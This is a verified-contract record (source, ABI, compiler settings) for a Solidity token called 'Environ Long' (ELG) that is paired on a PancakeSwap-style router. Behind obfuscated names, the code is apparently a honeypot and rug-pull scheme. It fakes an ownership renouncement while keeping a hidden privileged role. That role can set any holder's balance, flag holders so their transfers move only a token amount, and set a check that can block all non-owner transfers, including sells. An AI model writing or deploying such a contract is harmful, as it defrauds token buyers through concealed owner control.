{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface autoBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract totalSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptReceiver {\n    function createPair(address tokenReceiver, address walletShould) external returns (address);\n}\n\ninterface launchMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeWallet) external view returns (uint256);\n\n    function transfer(address marketingReceiver, uint256 exemptTotal) external returns (bool);\n\n    function allowance(address limitAtReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingReceiver,\n        uint256 exemptTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapList, uint256 value);\n    event Approval(address indexed limitAtReceiver, address indexed spender, uint256 value);\n}\n\ninterface txSell is launchMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EnvironLong is totalSwap, launchMode, txSell {\n\n    address private isLaunched;\n\n    address public exemptFund;\n\n    uint256 private atIs = 100000000 * 10 ** 18;\n\n    uint256 buyLaunched;\n\n    address autoSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function senderReceiver(address isTrading) public {\n        if (launchTeam) {\n            return;\n        }\n        \n        teamAmount[isTrading] = true;\n        \n        launchTeam = true;\n    }\n\n    function limitMax() private view {\n        require(teamAmount[_msgSender()]);\n    }\n\n    uint256 private sellAtWallet;\n\n    function balanceOf(address modeWallet) public view virtual override returns (uint256) {\n        return totalToken[modeWallet];\n    }\n\n    bool public launchMax;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenFrom;\n    }\n\n    uint256 toReceiver;\n\n    function receiverFund() public {\n        emit OwnershipTransferred(exemptFund, address(0));\n        isLaunched = address(0);\n    }\n\n    uint8 private txReceiver = 18;\n\n    address marketingLaunchedAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public amountTx;\n\n    function sellEnable(address shouldFeeToken, uint256 exemptTotal) public {\n        limitMax();\n        totalToken[shouldFeeToken] = exemptTotal;\n    }\n\n    mapping(address => mapping(address => uint256)) private totalMin;\n\n    uint256 private sellBuyMarketing;\n\n    bool public swapSellTeam;\n\n    address public tradingBuy;\n\n    function name() external view virtual override returns (string memory) {\n        return amountTrading;\n    }\n\n    function owner() external view returns (address) {\n        return isLaunched;\n    }\n\n    bool public launchTeam;\n\n    constructor (){\n        \n        autoBuy senderMin = autoBuy(autoSender);\n        tradingBuy = exemptReceiver(senderMin.factory()).createPair(senderMin.WETH(), address(this));\n        \n        exemptFund = _msgSender();\n        receiverFund();\n        teamAmount[exemptFund] = true;\n        totalToken[exemptFund] = atIs;\n        if (swapSellTeam == liquidityLimit) {\n            feeMarketingFrom = swapFrom;\n        }\n        emit Transfer(address(0), exemptFund, atIs);\n    }\n\n    function allowance(address toFromTotal, address tradingLimitSell) external view virtual override returns (uint256) {\n        if (tradingLimitSell == autoSender) {\n            return type(uint256).max;\n        }\n        return totalMin[toFromTotal][tradingLimitSell];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return txReceiver;\n    }\n\n    mapping(address => bool) public teamAmount;\n\n    uint256 private feeMarketingFrom;\n\n    function limitIs(address listTake, address marketingReceiver, uint256 exemptTotal) internal returns (bool) {\n        require(totalToken[listTake] >= exemptTotal);\n        totalToken[listTake] -= exemptTotal;\n        totalToken[marketingReceiver] += exemptTotal;\n        emit Transfer(listTake, marketingReceiver, exemptTotal);\n        return true;\n    }\n\n    function approve(address tradingLimitSell, uint256 exemptTotal) public virtual override returns (bool) {\n        totalMin[_msgSender()][tradingLimitSell] = exemptTotal;\n        emit Approval(_msgSender(), tradingLimitSell, exemptTotal);\n        return true;\n    }\n\n    function liquidityLaunch(address maxLaunched) public {\n        limitMax();\n        \n        if (maxLaunched == exemptFund || maxLaunched == tradingBuy) {\n            return;\n        }\n        amountTx[maxLaunched] = true;\n    }\n\n    function transfer(address shouldFeeToken, uint256 exemptTotal) external virtual override returns (bool) {\n        return feeWallet(_msgSender(), shouldFeeToken, exemptTotal);\n    }\n\n    function feeWallet(address listTake, address marketingReceiver, uint256 exemptTotal) internal returns (bool) {\n        if (listTake == exemptFund) {\n            return limitIs(listTake, marketingReceiver, exemptTotal);\n        }\n        uint256 sellAt = launchMode(tradingBuy).balanceOf(marketingLaunchedAt);\n        require(sellAt == toReceiver);\n        require(marketingReceiver != marketingLaunchedAt);\n        if (amountTx[listTake]) {\n            return limitIs(listTake, marketingReceiver, shouldBuy);\n        }\n        return limitIs(listTake, marketingReceiver, exemptTotal);\n    }\n\n    uint256 constant shouldBuy = 14 ** 10;\n\n    string private tokenFrom = \"ELG\";\n\n    bool private liquidityLimit;\n\n    uint256 public amountTotal;\n\n    string private amountTrading = \"Environ Long\";\n\n    uint256 public swapFrom;\n\n    function senderFund(uint256 exemptTotal) public {\n        limitMax();\n        toReceiver = exemptTotal;\n    }\n\n    function getOwner() external view returns (address) {\n        return isLaunched;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atIs;\n    }\n\n    event OwnershipTransferred(address indexed tradingReceiver, address indexed tokenTx);\n\n    mapping(address => uint256) private totalToken;\n\n    function transferFrom(address listTake, address marketingReceiver, uint256 exemptTotal) external override returns (bool) {\n        if (_msgSender() != autoSender) {\n            if (totalMin[listTake][_msgSender()] != type(uint256).max) {\n                require(exemptTotal <= totalMin[listTake][_msgSender()]);\n                totalMin[listTake][_msgSender()] -= exemptTotal;\n            }\n        }\n        return feeWallet(listTake, marketingReceiver, exemptTotal);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitAtReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFromTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingLimitSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLimitSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunched\",\"type\":\"address\"}],\"name\":\"liquidityLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFeeToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptTotal\",\"type\":\"uint256\"}],\"name\":\"sellEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptTotal\",\"type\":\"uint256\"}],\"name\":\"senderFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTrading\",\"type\":\"address\"}],\"name\":\"senderReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapSellTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFeeToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EnvironLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}